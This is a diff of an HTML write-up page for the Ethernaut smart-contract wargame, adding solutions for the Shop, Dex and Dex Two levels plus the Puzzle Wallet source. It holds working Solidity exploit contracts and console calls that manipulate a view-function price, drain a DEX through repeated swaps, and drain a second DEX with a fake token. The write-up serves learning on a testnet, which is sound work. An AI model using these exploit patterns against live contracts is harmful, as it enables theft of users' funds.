@@ -320,7 +320,7 @@
                                 <section class="normal markdown-section">
                                 
                                 <p><img src="Ethernaut/1_38TrQVgWh9G7BgtcX47EqQ.webp" alt="1_38TrQVgWh9G7BgtcX47EqQ" style="zoom:200%;"></p>
-<p>Online game <a href="https://ethernaut.openzeppelin.com/" target="_blank">Ethernaut</a>, Using SepoliaETH from <a href="https://sepolia-faucet.pk910.de/#/" target="_blank">mining faucet</a>.</p>
+<p>Online game <a href="https://ethernaut.openzeppelin.com/" target="_blank">Ethernaut</a>, Using SepoliaETH from <a href="https://sepolia-faucet.pk910.de/#/" target="_blank">mining faucet</a>. My account address is <code>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</code>. I only use it for testnet for security.</p>
 <h2 id="hello-ethernaut">Hello Ethernaut</h2>
 <p>Interact with contracts to complete challenges</p>
 <pre><code class="lang-js">&gt; <span class="hljs-keyword">await</span> contract.info()
@@ -1425,6 +1425,295 @@ contract exp{
 <p><em>Note</em>: An external <code>CALL</code> can use at most 63/64 of the gas currently available at the time of the <code>CALL</code>. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.</p>
 </blockquote>
 <h2 id="shop">shop</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+interface Buyer {
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">price</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint</span>);
+}
+
+<span class="hljs-title">contract</span> <span class="hljs-title">Shop</span> </span>{
+  uint public price = <span class="hljs-number">100</span>;
+  bool public isSold;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    Buyer _buyer = Buyer(msg.sender);
+
+    <span class="hljs-keyword">if</span> (_buyer.price() &gt;= price &amp;&amp; !isSold) {
+      isSold = <span class="hljs-literal">true</span>;
+      price = _buyer.price();
+    }
+  }
+}
+</code></pre>
+<p>Just like the previous level <a href="#Elevator">Elevator</a>. but at this time the interface was set to <code>view</code>, which means couldn&apos;t change the state of contract like we do at Elevator.</p>
+<p>but we could re-call the shop contract to construct two diffenrent returns value. (since the isSold variable was set to be public, its easy to do that)</p>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./chall/Shop.sol&quot;</span>;
+
+contract exp {
+    Shop levelInstance;
+
+    <span class="hljs-keyword">constructor</span>(address addr) {
+        levelInstance = Shop(addr);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">price</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>{
+        <span class="hljs-keyword">return</span> Shop(msg.sender).isSold() ? <span class="hljs-number">0</span> : <span class="hljs-number">100</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        levelInstance.buy();
+    }
+}
+</code></pre>
+<p>and I have to say that even the <code>staticcall</code> could not prevent this. staticcall prevents many bytecode instructions from being called, but even within the contract there is still state changing. Related challenges: MetaTrust CTF 2023: <a href="https://ranwen.de/posts/2023-09-17-metatrust23/#who" target="_blank">Who(stage1)</a>. </p>
+<h2 id="dex">Dex</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;openzeppelin-contracts-08/access/Ownable.sol&apos;</span>;
+
+contract Dex is Ownable {
+  address public token1;
+  address public token2;
+  <span class="hljs-keyword">constructor</span>() {}
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTokens</span>(<span class="hljs-params">address _token1, address _token2</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>{
+    token1 = _token1;
+    token2 = _token2;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLiquidity</span>(<span class="hljs-params">address token_address, uint amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>{
+    IERC20(token_address).transferFrom(msg.sender, address(<span class="hljs-keyword">this</span>), amount);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span>(<span class="hljs-params">address from, address to, uint amount</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>((<span class="hljs-keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="hljs-keyword">from</span> == token2 &amp;&amp; to == token1), <span class="hljs-string">&quot;Invalid tokens&quot;</span>);
+    <span class="hljs-built_in">require</span>(IERC20(<span class="hljs-keyword">from</span>).balanceOf(msg.sender) &gt;= amount, <span class="hljs-string">&quot;Not enough to swap&quot;</span>);
+    uint swapAmount = getSwapPrice(<span class="hljs-keyword">from</span>, to, amount);
+    IERC20(<span class="hljs-keyword">from</span>).transferFrom(msg.sender, address(<span class="hljs-keyword">this</span>), amount);
+    IERC20(to).approve(address(<span class="hljs-keyword">this</span>), swapAmount);
+    IERC20(to).transferFrom(address(<span class="hljs-keyword">this</span>), msg.sender, swapAmount);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSwapPrice</span>(<span class="hljs-params">address from, address to, uint amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint</span>)</span>{
+    <span class="hljs-keyword">return</span>((amount * IERC20(to).balanceOf(address(<span class="hljs-keyword">this</span>)))/IERC20(<span class="hljs-keyword">from</span>).balanceOf(address(<span class="hljs-keyword">this</span>)));
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params">address spender, uint amount</span>) <span class="hljs-title">public</span> </span>{
+    SwappableToken(token1).approve(msg.sender, spender, amount);
+    SwappableToken(token2).approve(msg.sender, spender, amount);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params">address token, address account</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint</span>)</span>{
+    <span class="hljs-keyword">return</span> IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableToken is ERC20 {
+  address private _dex;
+  <span class="hljs-keyword">constructor</span>(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params">address owner, address spender, uint256 amount</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>(owner != _dex, <span class="hljs-string">&quot;InvalidApprover&quot;</span>);
+    <span class="hljs-keyword">super</span>._approve(owner, spender, amount);
+  }
+}
+</code></pre>
+<p>logical vulnerability. The calculation logic of the function <code>getSwapPrice</code> allows us to get more tokens by converting between two tokens</p>
+<pre><code class="lang-js"><span class="hljs-keyword">let</span> token1 = <span class="hljs-keyword">await</span> contract.token1();
+<span class="hljs-keyword">let</span> token2 = <span class="hljs-keyword">await</span> contract.token2();
+<span class="hljs-keyword">await</span> contract.approve(instance, <span class="hljs-number">1000</span>);
+<span class="hljs-keyword">await</span> contract.swap(token1, token2, <span class="hljs-number">10</span>);
+<span class="hljs-keyword">await</span> contract.swap(token2, token1, <span class="hljs-number">20</span>);
+<span class="hljs-keyword">await</span> contract.swap(token1, token2, <span class="hljs-number">24</span>);
+<span class="hljs-keyword">await</span> contract.swap(token2, token1, <span class="hljs-number">30</span>);
+<span class="hljs-keyword">await</span> contract.swap(token1, token2, <span class="hljs-number">41</span>);
+<span class="hljs-keyword">await</span> contract.swap(token2, token1, <span class="hljs-number">45</span>); 
+
+<span class="hljs-keyword">await</span> contract.balanceOf(token1, instance);
+<span class="hljs-keyword">await</span> contract.balanceOf(token2, instance);
+</code></pre>
+<h2 id="dex-two">Dex Two</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;openzeppelin-contracts-08/access/Ownable.sol&apos;</span>;
+
+contract DexTwo is Ownable {
+  address public token1;
+  address public token2;
+  <span class="hljs-keyword">constructor</span>() {}
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTokens</span>(<span class="hljs-params">address _token1, address _token2</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>{
+    token1 = _token1;
+    token2 = _token2;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_liquidity</span>(<span class="hljs-params">address token_address, uint amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>{
+    IERC20(token_address).transferFrom(msg.sender, address(<span class="hljs-keyword">this</span>), amount);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span>(<span class="hljs-params">address from, address to, uint amount</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>(IERC20(<span class="hljs-keyword">from</span>).balanceOf(msg.sender) &gt;= amount, <span class="hljs-string">&quot;Not enough to swap&quot;</span>);
+    uint swapAmount = getSwapAmount(<span class="hljs-keyword">from</span>, to, amount);
+    IERC20(<span class="hljs-keyword">from</span>).transferFrom(msg.sender, address(<span class="hljs-keyword">this</span>), amount);
+    IERC20(to).approve(address(<span class="hljs-keyword">this</span>), swapAmount);
+    IERC20(to).transferFrom(address(<span class="hljs-keyword">this</span>), msg.sender, swapAmount);
+  } 
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSwapAmount</span>(<span class="hljs-params">address from, address to, uint amount</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint</span>)</span>{
+    <span class="hljs-keyword">return</span>((amount * IERC20(to).balanceOf(address(<span class="hljs-keyword">this</span>)))/IERC20(<span class="hljs-keyword">from</span>).balanceOf(address(<span class="hljs-keyword">this</span>)));
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params">address spender, uint amount</span>) <span class="hljs-title">public</span> </span>{
+    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params">address token, address account</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint</span>)</span>{
+    <span class="hljs-keyword">return</span> IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableTokenTwo is ERC20 {
+  address private _dex;
+  <span class="hljs-keyword">constructor</span>(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params">address owner, address spender, uint256 amount</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>(owner != _dex, <span class="hljs-string">&quot;InvalidApprover&quot;</span>);
+    <span class="hljs-keyword">super</span>._approve(owner, spender, amount);
+  }
+}
+</code></pre>
+<p>Only swap function have modified a little. thats mean we could specify a evil contract address to swap the real token.</p>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract exp {
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params">address spender, uint256 value</span>) <span class="hljs-title">external</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params">address from, address to, uint256 value</span>) <span class="hljs-title">external</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params">address account</span>) <span class="hljs-title">external</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>{
+        <span class="hljs-keyword">return</span> uint256(<span class="hljs-number">10</span>);
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">receive</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> </span>{ }
+}
+</code></pre>
+<pre><code class="lang-js"><span class="hljs-keyword">let</span> token1 = <span class="hljs-keyword">await</span> contract.token1();
+<span class="hljs-keyword">let</span> token2 = <span class="hljs-keyword">await</span> contract.token2();
+<span class="hljs-keyword">let</span> exp = <span class="hljs-string">&apos;0x3327f08D1BaA8076C5f185DE898667fdF7D2D96F&apos;</span>;
+<span class="hljs-keyword">await</span> contract.swap(exp, token1, <span class="hljs-number">10</span>);
+<span class="hljs-keyword">await</span> contract.swap(exp, token2, <span class="hljs-number">10</span>);
+</code></pre>
+<h2 id="puzzle-wallet">Puzzle Wallet</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+pragma experimental ABIEncoderV2;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span>;
+
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;
+    address public admin;
+
+    <span class="hljs-keyword">constructor</span>(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
+        admin = _admin;
+    }
+
+    modifier onlyAdmin {
+      <span class="hljs-built_in">require</span>(msg.sender == admin, <span class="hljs-string">&quot;Caller is not the admin&quot;</span>);
+      _;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">proposeNewAdmin</span>(<span class="hljs-params">address _newAdmin</span>) <span class="hljs-title">external</span> </span>{
+        pendingAdmin = _newAdmin;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approveNewAdmin</span>(<span class="hljs-params">address _expectedAdmin</span>) <span class="hljs-title">external</span> <span class="hljs-title">onlyAdmin</span> </span>{
+        <span class="hljs-built_in">require</span>(pendingAdmin == _expectedAdmin, <span class="hljs-string">&quot;Expected new admin by the current admin is not the pending admin&quot;</span>);
+        admin = pendingAdmin;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upgradeTo</span>(<span class="hljs-params">address _newImplementation</span>) <span class="hljs-title">external</span> <span class="hljs-title">onlyAdmin</span> </span>{
+        _upgradeTo(_newImplementation);
+    }
+}
+
+contract PuzzleWallet {
+    address public owner;
+    uint256 public maxBalance;
+    mapping(address =&gt; bool) public whitelisted;
+    mapping(address =&gt; uint256) public balances;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params">uint256 _maxBalance</span>) <span class="hljs-title">public</span> </span>{
+        <span class="hljs-built_in">require</span>(maxBalance == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Already initialized&quot;</span>);
+        maxBalance = _maxBalance;
+        owner = msg.sender;
+    }
+
+    modifier onlyWhitelisted {
+        <span class="hljs-built_in">require</span>(whitelisted[msg.sender], <span class="hljs-string">&quot;Not whitelisted&quot;</span>);
+        _;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setMaxBalance</span>(<span class="hljs-params">uint256 _maxBalance</span>) <span class="hljs-title">external</span> <span class="hljs-title">onlyWhitelisted</span> </span>{
+      <span class="hljs-built_in">require</span>(address(<span class="hljs-keyword">this</span>).balance == <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Contract balance is not 0&quot;</span>);
+      maxBalance = _maxBalance;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addToWhitelist</span>(<span class="hljs-params">address addr</span>) <span class="hljs-title">external</span> </span>{
+        <span class="hljs-built_in">require</span>(msg.sender == owner, <span class="hljs-string">&quot;Not the owner&quot;</span>);
+        whitelisted[addr] = <span class="hljs-literal">true</span>;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> <span class="hljs-title">onlyWhitelisted</span> </span>{
+      <span class="hljs-built_in">require</span>(address(<span class="hljs-keyword">this</span>).balance &lt;= maxBalance, <span class="hljs-string">&quot;Max balance reached&quot;</span>);
+      balances[msg.sender] += msg.value;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params">address to, uint256 value, bytes calldata data</span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> <span class="hljs-title">onlyWhitelisted</span> </span>{
+        <span class="hljs-built_in">require</span>(balances[msg.sender] &gt;= value, <span class="hljs-string">&quot;Insufficient balance&quot;</span>);
+        balances[msg.sender] -= value;
+        (bool success, ) = to.call{ value: value }(data);
+        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">&quot;Execution failed&quot;</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">multicall</span>(<span class="hljs-params">bytes[] calldata data</span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> <span class="hljs-title">onlyWhitelisted</span> </span>{
+        bool depositCalled = <span class="hljs-literal">false</span>;
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; data.length; i++) {
+            bytes memory _data = data[i];
+            bytes4 selector;
+            assembly {
+                selector := mload(add(_data, <span class="hljs-number">32</span>))
+            }
+            <span class="hljs-keyword">if</span> (selector == <span class="hljs-keyword">this</span>.deposit.selector) {
+                <span class="hljs-built_in">require</span>(!depositCalled, <span class="hljs-string">&quot;Deposit can only be called once&quot;</span>);
+                <span class="hljs-comment">// Protect against reusing msg.value</span>
+                depositCalled = <span class="hljs-literal">true</span>;
+            }
+            (bool success, ) = address(<span class="hljs-keyword">this</span>).delegatecall(data[i]);
+            <span class="hljs-built_in">require</span>(success, <span class="hljs-string">&quot;Error while delegating call&quot;</span>);
+        }
+    }
+}
+</code></pre>
 
                                 
                                 </section>
@@ -1468,7 +1757,7 @@ contract exp{
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.4","depth":1,"next":{"title":"羊城杯 2023 web writeup","level":"1.5","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"previous":{"title":"TCP1P CTF 2023 blockchain","level":"1.3","depth":1,"anchor":"#231016","path":"TCP1P CTF 2023 blockchain.md","ref":"TCP1P CTF 2023 blockchain.md#231016","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Ethernaut.md","mtime":"2023-11-18T16:18:58.825Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-18T16:19:41.522Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.4","depth":1,"next":{"title":"羊城杯 2023 web writeup","level":"1.5","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"previous":{"title":"TCP1P CTF 2023 blockchain","level":"1.3","depth":1,"anchor":"#231016","path":"TCP1P CTF 2023 blockchain.md","ref":"TCP1P CTF 2023 blockchain.md#231016","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Ethernaut.md","mtime":"2023-11-21T14:27:49.439Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-21T14:43:38.580Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
